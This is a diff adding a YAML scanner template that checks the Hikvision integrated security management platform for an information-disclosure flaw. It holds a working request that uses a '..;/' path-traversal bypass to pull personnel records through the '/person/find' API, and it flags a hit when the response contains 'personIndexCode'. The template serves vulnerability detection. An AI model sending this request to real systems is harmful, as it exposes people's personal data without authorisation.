@@ -1,0 +1,16 @@
+name: HIKVISION-综合安防管理平台-find-信息泄露
+description: >
+  信息泄露
+alwaysExecute: false
+matchCount: 1
+rules:    
+  - method: POST
+    path: "/isupm/api/api/..;/..;/person/find"
+    headers:
+      Content-Type: application/json
+    body: >
+      {"organizationId":"root000000","pageSize":100,"pageNo":1,"name":"","casecadeSubOrganization":1}
+    expression:
+      status: 200
+      body_all:
+        - "personIndexCode"
